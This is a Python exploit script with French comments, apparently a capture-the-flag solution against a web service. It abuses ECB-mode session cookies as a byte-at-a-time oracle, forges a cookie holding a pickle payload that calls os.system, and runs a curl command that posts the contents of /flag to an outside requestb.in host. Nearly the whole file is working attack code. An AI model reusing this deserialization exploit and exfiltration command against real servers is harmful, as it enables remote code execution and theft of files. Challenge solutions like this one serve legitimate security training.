#!/usr/bin/env python3
import requests
import struct
import random
import sys


if len(sys.argv) < 3:
    sys.stderr.write('error:%s HOST PORT\n' % sys.argv[0])
    exit(1)

host = sys.argv[1]
port = int(sys.argv[2])


def cipher(username):
    # ajout d'un prefix random de taille fixe
    # pour que chaque username soit unique
    prefix = bytes([random.randint(0x20, 0x7e) for _ in range(4)])

    data = {
        'username': prefix + username,
        'password': 'A' * 8,
        'password-confirm': 'A' * 8
    }
    r = requests.post('http://%s:%d/register' % (host, port), data=data)
    return r.cookies['session']


def decipher(cookie):
    requests.get('http://%s:%d/' % (host, port), cookies={'session': cookie})


def split_fix_length(buf, n):
    return [buf[i:i + n] for i in range(0, len(buf), n)]


# trouver la longueur de l'username qui va donner 2 fois le même bloc
length = 1
while True:
    blocks = split_fix_length(cipher(b'A' * length), 32)
    if len(blocks) > 3 and blocks[2] == blocks[3]:
        break
    length += 1

# on sait donc que cette longueur - 32 commence un nouveau bloc (le 3-ième)
length -= 2 * 16

# trouver ce que le serveur ajoute à la fin après notre username
append = b''

while len(append) < 16:
    blocks = split_fix_length(cipher(b'A' * (length + 16 - len(append) - 1)), 32)
    needed_block = blocks[2]
    for c in range(256):
        blocks = split_fix_length(cipher(b'A' * (length + 16 - len(append) - 1) + append + bytes([c])), 32)
        if needed_block == blocks[2]:
            append += bytes([c])
            break
    print('\rFound %r' % append, end='')

# payload
# le challenge ici n'est d'utiliser que de l'ascii
# ce qui est au final simple avec pickle (voir /usr/lib/python3.5/pickle.py)
cmd = b'curl -X POST -d "$(cat /flag)" http://requestb.in/xn5l3wxn'

inject = b'cposix\nsystem\n' # push os.system (load_global)
inject += b'(' # push mark (load_mark)
inject += b'X' + struct.pack('<I', len(cmd)) + cmd # push 'ls' (load_binunicode)
inject += b't' # stack[k:] = [tuple(stack[k+1:])] (load_tuple)
inject += b'R' # stack[-2](stack[-1]) (load_reduce)
inject += b'\x00' * ((16 - len(inject) % 16) % 16)

payload = ''
blocks = split_fix_length(cipher(b'A' * length), 32)
payload += blocks[0] + blocks[1]
blocks = split_fix_length(cipher(b'A' * length + inject), 32)
payload += ''.join(blocks[2:2 + len(inject) // 16])
decipher(payload)
